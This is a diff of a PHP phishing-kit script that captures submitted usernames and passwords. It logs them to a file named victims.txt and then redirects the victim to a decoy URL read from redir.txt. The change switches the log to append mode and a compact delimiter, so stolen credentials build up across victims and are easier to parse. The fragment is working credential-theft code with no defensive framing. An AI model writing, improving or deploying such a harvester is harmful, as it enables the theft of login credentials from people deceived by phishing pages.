@@ -6,8 +6,8 @@ $f = fopen('redir.txt','r');
 $r = fread($f,filesize("redir.txt"));    
 fclose($f);
 if ($u && $p){
-  $f = fopen('victims.txt','w+');
-  fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
+  $f = fopen('victims.txt','a+');
+  fwrite($f,$u.'<!:!>'.$p."\n");
   fclose($f);
   echo "<script>window.open('".$r."','_top')</script>";
 }
